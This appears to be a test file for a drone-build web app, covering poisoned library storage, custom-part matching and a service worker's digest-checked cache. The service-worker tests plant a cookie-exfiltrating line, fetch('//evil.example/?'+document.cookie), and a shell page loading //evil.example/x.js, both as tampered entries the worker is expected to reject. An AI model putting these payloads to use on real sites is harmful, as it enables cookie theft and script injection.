// Hardening round: poisoned library storage, custom parts versus the region note, and sw.js under attack
// (stub ServiceWorkerGlobalScope with real WebCrypto, see sw-harness.mjs).
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import * as E from '../js/engine.js';
import * as C from '../js/catalog.js';
import * as M from '../js/matcher.js';
import * as PERF from '../js/ui/perf.js';
import * as CHK from '../js/checks.js';
import { createState } from '../js/ui/state.js';
import { createLibrary, LIB_KEY, LIB_MAX } from '../js/ui/library.js';
import { createCustom } from '../js/ui/custom.js';
import { BASE, loadSw, memCaches, withShell } from './sw-harness.mjs';

test.afterEach(() => { C.CUSTOM.length = 0; });

// ---- library (L4)
const X = createState({ E, C, M, PERF, CHK });
const HASH = '#s=3&m=inspection';
const memStore = (init) => { const m = new Map(init ? [[LIB_KEY, JSON.stringify(init)]] : []); return { getItem: (k) => m.get(k) ?? null, setItem: (k, v) => m.set(k, String(v)), m }; };
const entry = (o) => ({ id: 'a1', name: 'Good', hash: HASH, savedAt: 1, ...o });

test('library: one poisoned entry is dropped or cleaned, never the whole list', () => {
  const st = memStore([entry({ id: 'good1' }), entry({ id: 'p1', name: { toString: 1 } }), entry({ id: ['arr'] }), entry({ id: 5 }), entry({ id: { toString: () => 'obj' } }), entry({ id: 'good2', name: 'Two' })]);
  const L = createLibrary(X, st, () => 1);
  assert.doesNotThrow(() => L.list());
  assert.deepEqual(L.list().map((b) => b.id), ['good1', 'p1', 'good2'], 'non-string ids dropped, the rest kept');
  assert.equal(L.list()[1].name, 'Untitled build', 'a non-string name falls back instead of throwing in cleanName');
  assert.ok(L.save({ ...X.parse('#s=3&m=mapping').S, name: 'New' }, 'x').ok);
  assert.equal(L.list().length, 4, 'a save after the poison keeps the survivors (it used to write back [])');
  assert.ok(L.remove('good2') && !L.list().some((b) => b.id === 'good2'), 'ids that survive can be deleted');
  // an entry whose hash makes the parser itself throw is dropped alone
  const Xb = { ...X, parse: (h) => { if (h.includes('boom')) throw new Error('boom'); return X.parse(h); } };
  assert.deepEqual(createLibrary(Xb, memStore([entry({ id: 'bad', hash: '#s=3&m=inspection&boom' }), entry({ id: 'ok' })])).list().map((b) => b.id), ['ok']);
});

test('library: validates at most LIB_MAX stored entries, however many are stored', () => {
  const st = memStore(Array.from({ length: 50000 }, (_, i) => entry({ id: 'i' + i })));
  let parsed = 0;
  const L = createLibrary({ ...X, parse: (h) => { parsed++; return X.parse(h); } }, st);
  assert.equal(L.list().length, LIB_MAX);
  assert.equal(parsed, LIB_MAX, 'sliced before mapped: 20 parses, not 50000');
});

// ---- matcher (L8)
const fpv = { frame: { minSizeMm: 200, maxSizeMm: 250, material: 'carbon', configuration: 'quad' }, motor: { statorMm: '2306', kvMin: 1600, kvMax: 2000, minThrustG: 1200, count: 4 }, esc: { minContinuousA: 40, minCells: 6, maxCells: 6, protocol: 'DShot600' },
  battery: { cells: 6, minMah: 1200, maxMah: 1600, minC: 75, chemistry: 'lipo' }, prop: { inch: 5 }, fc: { minMotorOutputs: 4, needsGps: false } };
const motor = (o = {}) => ({ category: 'motor', name: 'Test 2306', brand: 'Me', priceUsd: 0.01, weightG: 30, specs: { statorMm: '2306', kv: 1800, maxThrustG: 1500, maxCurrentA: 40, minCells: 4, maxCells: 6 }, ...o });
const rec = (region) => M.recommend(fpv, 'fpv', undefined, undefined, region);

test('matcher: a custom part sits beside the verified catalog fits and never hides the international-parts note', () => {
  C.CUSTOM.length = 0;
  const CUS = createCustom(C, memStore());
  const base = Object.fromEntries(['IN', 'JP', 'US'].map((r) => [r, rec(r)]));
  assert.ok(base.IN.regionFallback.includes('motor') && base.JP.regionFallback.includes('motor'), 'precondition: no local motor listing in IN or JP');
  const { id } = CUS.add(motor());
  for (const region of ['IN', 'JP', 'US']) {
    const r = rec(region), b = base[region];
    assert.equal(r.motor[0].id, id, 'the custom part still wins on score in ' + region);
    assert.ok(b.motor.slice(0, 2).every((m) => r.motor.some((i) => i.id === m.id)), 'top catalog fits stay listed in ' + region);
    assert.equal(r.regionFallback.includes('motor'), b.regionFallback.includes('motor'), 'region fallback unchanged in ' + region);
    assert.equal(r.notes.some((n) => /^No local listing found/.test(n)), b.notes.some((n) => /^No local listing found/.test(n)), 'international-parts note unchanged in ' + region);
    assert.equal(r.motor.find((i) => i.id === id).localListing, true, 'still flagged as in hand');
  }
  // three fitting custom parts cannot crowd every verified fit out of the three slots
  CUS.add(motor({ name: 'B' })); CUS.add(motor({ name: 'C' }));
  const crowd = rec('IN').motor;
  assert.equal(crowd.length, 3); assert.ok(crowd.some((i) => !i.custom), 'a catalog fit survives');
  assert.equal(crowd.filter((i) => i.custom).length, 2);
  // without custom parts the result is exactly the catalog result
  C.CUSTOM.length = 0;
  assert.deepEqual(rec('IN').motor.map((i) => i.id), base.IN.motor.map((i) => i.id));
});

// ---- service worker
const FILES = { 'index.html': '<!doctype html><title>ok</title>', 'js/app.js': 'export const ok = 1;', 'css/main.css': 'body{margin:0}' };
const SRC = withShell(fs.readFileSync(path.join(import.meta.dirname, '..', 'sw.js'), 'utf8'), FILES);
const VERSION = /const CACHE_VERSION = '([^']+)'/.exec(SRC)[1], keyOf = (p) => BASE + p;
// A scripted network: serves FILES unless `over` replaces a body (or, with a function, decides per call); logs every request.
const net = (over = {}) => { const log = []; const fetch = async (r) => { log.push(r); const rel = r.url.slice(BASE.length).split('?')[0] || 'index.html'; const o = Object.hasOwn(over, rel) ? over[rel] : Object.hasOwn(FILES, rel) ? FILES[rel] : undefined, b = typeof o === 'function' ? o(r) : o; return b === undefined ? new Response('NET ' + r.url) : new Response(b, { status: b === 404 ? 404 : 200 }); }; return { fetch, log }; };
const installed = async (over) => { const n = net(over), w = loadSw(SRC, { fetch: n.fetch }); await w.fire('install'); n.log.length = 0; return { ...w, net: n }; };

test('sw: install precaches only bytes that match their digest', async () => {
  const w = await installed();
  assert.deepEqual([...w.caches.stores.get(VERSION).keys()].sort(), Object.keys(FILES).map(keyOf).sort());
  assert.equal(w.sw.skipped, 0, 'install never skips waiting by itself');
});

test('sw: a stale CDN copy is retried once under a cache-busting query, then accepted', async () => {
  let calls = 0;
  const n = net({ 'js/app.js': (r) => (calls++ === 0 ? 'export const stale = 1;' : FILES['js/app.js']) }), w = loadSw(SRC, { fetch: n.fetch });
  await w.fire('install');
  assert.equal(calls, 2);
  assert.ok(n.log.filter((r) => r.url.startsWith(keyOf('js/app.js'))).map((r) => r.url).some((u) => /\?v=[0-9a-f]{12}$/.test(u)), 'second try carries ?v=<digest>');
  assert.ok(n.log.every((r) => r.cache === 'reload'));
  assert.equal(await (await w.caches.stores.get(VERSION).get(keyOf('js/app.js'))).text(), FILES['js/app.js'], 'the verified copy is what is cached');
});

test('sw: an install digest mismatch (or a bad status) fails the install, so the old version stays', async () => {
  for (const [name, over] of [['wrong bytes', { 'index.html': '<script>evil()</script>' }], ['404', { 'css/main.css': 404 }]]) {
    const w = loadSw(SRC, { fetch: net(over).fetch });
    await assert.rejects(w.fire('install'), /digest mismatch/, name);
  }
  await assert.rejects(loadSw(SRC, { fetch: async () => { throw new TypeError('offline'); } }).fire('install'), TypeError, 'a network error fails it too');
});

test('sw: a tampered cache entry is rejected, deleted and refetched from the network', async () => {
  const w = await installed(), store = w.caches.stores.get(VERSION);
  store.set(keyOf('js/app.js'), new Response('fetch("//evil.example/?"+document.cookie)'));
  assert.equal(await (await w.get('js/app.js')).text(), FILES['js/app.js'], 'served from the network, not the poisoned copy');
  assert.equal(w.net.log.length, 1); assert.ok(!store.has(keyOf('js/app.js')), 'the poisoned entry is deleted');
  // the shell page itself (CSP meta stripped) is the real target
  store.set(keyOf('index.html'), new Response('<!doctype html><script src=//evil.example/x.js></script>', { headers: { 'content-type': 'text/html' } }));
  assert.equal(await (await w.get('?x=1', { mode: 'navigate' })).text(), FILES['index.html'], 'navigation never serves a poisoned shell');
  // an untampered entry is still served from the cache with no network
  w.net.log.length = 0;
  assert.equal(await (await w.get('css/main.css')).text(), FILES['css/main.css']); assert.equal(w.net.log.length, 0);
  // entries outside SHELL, including prototype-ish names, are never served from the cache
  for (const p of ['extra.js', 'constructor', '__proto__']) {
    store.set(keyOf(p), new Response('evil'));
    assert.equal(await (await w.get(p)).text(), 'NET ' + keyOf(p), p);
  }
});

test('sw: any Cache Storage failure falls back to the network instead of failing the request', async () => {
  const w = await installed();
  w.caches.fail = true;
  assert.equal(await (await w.get('js/app.js')).text(), FILES['js/app.js']);
  assert.equal(await (await w.get('', { mode: 'navigate' })).text(), FILES['index.html']);
  assert.equal(w.net.log.length, 2, 'both came from the network');
});

test('sw: SKIP_WAITING calls skipWaiting, nothing else does', async () => {
  const w = await installed();
  await w.fire('activate'); assert.equal(w.sw.skipped, 0);
  for (const data of [{ type: 'OTHER' }, 'SKIP_WAITING', null, undefined, { type: ['SKIP_WAITING'] }]) await w.fire('message', { data });
  assert.equal(w.sw.skipped, 0, 'other messages are ignored');
  await w.fire('message', { data: { type: 'SKIP_WAITING' } });
  assert.equal(w.sw.skipped, 1);
});
